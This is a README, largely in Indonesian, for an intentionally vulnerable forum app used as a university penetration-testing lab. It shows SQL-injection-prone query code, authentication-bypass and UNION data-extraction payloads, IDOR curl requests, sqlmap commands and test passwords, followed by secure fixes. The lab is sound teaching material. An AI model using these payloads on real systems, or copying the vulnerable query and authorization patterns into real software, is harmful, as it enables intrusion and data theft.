# Vulnerable Forum - Penetration Testing Lab

⚠️ **WARNING: This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy to production!**

## 📚 Deskripsi

Aplikasi forum sederhana yang dirancang khusus untuk pembelajaran **penetration testing** dengan fokus pada:
- **SQL Injection** vulnerabilities
- **IDOR (Insecure Direct Object Reference)** vulnerabilities

Dibuat untuk mata kuliah Keamanan Jaringan.

## 🛠️ Tech Stack

- **Frontend**: React 18 + Tailwind CSS + Vite
- **Backend**: Node.js + Express.js
- **Database**: SQLite

## 📁 Struktur Folder

```
Finprokemjar/
├── backend/
│   ├── package.json
│   ├── .env
│   ├── server.js
│   ├── database.js
│   └── setup-database.js
└── frontend/
    ├── package.json
    ├── vite.config.js
    ├── tailwind.config.js
    ├── postcss.config.js
    ├── index.html
    └── src/
        ├── main.jsx
        ├── App.jsx
        ├── index.css
        └── pages/
            ├── Login.jsx
            ├── Forum.jsx
            └── Profile.jsx
```

## 🚀 Cara Instalasi

### Prerequisites

Pastikan sudah terinstal:
- Node.js (v16 atau lebih baru)
- npm atau yarn

### 1. Setup Backend

```powershell
# Masuk ke folder backend
cd backend

# Install dependencies
npm install

# Setup database
node setup-database.js

# Jalankan server
node server.js
```

Backend akan berjalan di: `http://localhost:5000`

```powershell
# Buka terminal baru, masuk ke folder frontend
cd frontend

# Install dependencies
npm install

# Jalankan development server
npm run dev
```

### 2. Setup Frontend

```powershell
# Buka terminal baru, masuk ke folder frontend
cd frontend

# Install dependencies
npm install

# Jalankan development server
npm run dev
```

Frontend akan berjalan di: `http://localhost:3000`

## 📊 Cara Melihat Database

Database menggunakan SQLite (file: `backend/vulnerable_forum.db`)

### DB Browser for SQLite (Recommended)
1. Download: https://sqlitebrowser.org/dl/
2. Install aplikasi
3. Buka aplikasi → Open Database
4. Pilih `backend/vulnerable_forum.db`
5. Klik tab "Browse Data" untuk lihat isi tabel

### VS Code Extension
1. Install extension "SQLite" by alexcvzz
2. Klik kanan file `vulnerable_forum.db`
3. Pilih "Open Database"
4. Lihat di sidebar "SQLITE EXPLORER"

**Detail lengkap:** Lihat file `DATABASE_VIEWER.md`

## 👤 Test Accounts

| Username | Password    | Role  |
|----------|-------------|-------|
| hilmy    | hilmy123    | admin |
| andi     | andi123     | user  |
| dika     | dika123     | user  |
| aliya    | aliya123    | user  |
| putri    | putri123    | user  |
| reza     | reza123     | user  |

## 🎯 Kerentanan yang Diimplementasikan

### 1. SQL Injection

#### **Login Page** (`/api/login`)

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Cara Testing:**

1. **Basic SQL Injection - Bypass Authentication**
   - Username: `hilmy' OR '1'='1' --`
   - Password: `anything`
   - Hasil: Berhasil login sebagai hilmy tanpa password yang benar

2. **Alternative Payloads:**
   - `hilmy' --`
   - `' OR 1=1 --`
   - `hilmy' OR 'a'='a' --`

3. **Information Disclosure:**
   - Username: `' UNION SELECT NULL, username, password, email, role, NULL FROM users --`
   - Bisa melihat data dari tabel users

#### **Search Posts** (`/api/posts/search?q=`)

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM posts WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`;
```

**Cara Testing:**

1. Search: `%' UNION SELECT id, username, password, email, NULL, NULL FROM users --`
2. Bisa ekstrak data dari tabel lain

### 2. IDOR (Insecure Direct Object Reference)

#### **User Profile** (`/api/users/:id`)

**Vulnerable:**
- Tidak ada authorization check
- Setiap user bisa mengakses profil user lain
- Setiap user bisa mengedit profil user lain

**Cara Testing:**

1. **View Other Profiles:**
   - Login sebagai john (user id 2)
   - Akses URL: `http://localhost:3000/profile/1` (admin profile)
   - Akses URL: `http://localhost:3000/profile/3` (alice profile)
   - Result: Bisa melihat profil user lain

2. **Edit Other Profiles:**
   - Login sebagai john
   - Buka profile user lain (misal: `/profile/1`)
   - Klik tombol "Edit Profile"
   - Ubah email
   - Result: Berhasil mengubah email user lain!

3. **Using API Directly:**
   ```powershell
   # View profile
   curl http://localhost:5000/api/users/1
   
   # Update profile (IDOR)
   curl -X PUT http://localhost:5000/api/users/1 -H "Content-Type: application/json" -d "{\"email\":\"hacked@evil.com\"}"
   ```

## 🔍 Tools untuk Testing

### Burp Suite
1. Setup proxy di browser (localhost:8080)
2. Intercept request login
3. Modify parameter username/password dengan SQL injection payload
4. Analyze response

### SQLMap
```powershell
# Test login endpoint
sqlmap -u "http://localhost:5000/api/login" --data="username=admin&password=test" --batch

# Test search endpoint
sqlmap -u "http://localhost:5000/api/posts/search?q=test" --batch
```

### Postman / cURL
```powershell
# SQL Injection test
curl -X POST http://localhost:5000/api/login -H "Content-Type: application/json" -d "{\"username\":\"admin' OR '1'='1' --\",\"password\":\"anything\"}"

# IDOR test - View user
curl http://localhost:5000/api/users/1

# IDOR test - Update user
curl -X PUT http://localhost:5000/api/users/1 -H "Content-Type: application/json" -d "{\"email\":\"changed@test.com\"}"
```

## 📝 Laporan Testing

Dokumentasikan hasil testing Anda dengan format:

1. **Vulnerability Type**: SQL Injection / IDOR
2. **Endpoint**: URL endpoint yang ditest
3. **Payload**: Payload yang digunakan
4. **Impact**: Dampak keberhasilan exploit
5. **Screenshot**: Screenshot hasil testing
6. **Recommendation**: Cara memperbaiki vulnerability

## 🛡️ Cara Memperbaiki Vulnerabilities

### Fix SQL Injection:

**SALAH (Vulnerable):**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

**BENAR (Secure):**
```javascript
// Gunakan parameterized queries
const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const result = await pool.query(query, [username, password]);
```

### Fix IDOR:

**SALAH (Vulnerable):**
```javascript
app.get('/api/users/:id', async (req, res) => {
  const { id } = req.params;
  // No authorization check!
  const user = await getUser(id);
  res.json(user);
});
```

**BENAR (Secure):**
```javascript
app.get('/api/users/:id', authenticateToken, async (req, res) => {
  const { id } = req.params;
  
  // Check if user is accessing their own profile or is admin
  if (req.user.id !== parseInt(id) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const user = await getUser(id);
  res.json(user);
});
```

## 📚 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

## ⚠️ Disclaimer

Aplikasi ini dibuat **HANYA untuk tujuan edukasi** dalam lingkungan pembelajaran yang terkontrol. 

**DILARANG:**
- ❌ Deploy ke production
- ❌ Gunakan di jaringan publik
- ❌ Simpan data sensitif/real
- ❌ Gunakan untuk tujuan ilegal

**Gunakan dengan bijak untuk pembelajaran keamanan siber!**

## 📧 Contact

Untuk pertanyaan atau diskusi tentang project ini, silakan hubungi dosen/instruktur mata kuliah Keamanan Jaringan.

---

**Happy Hacking (Ethically)! 🔒**
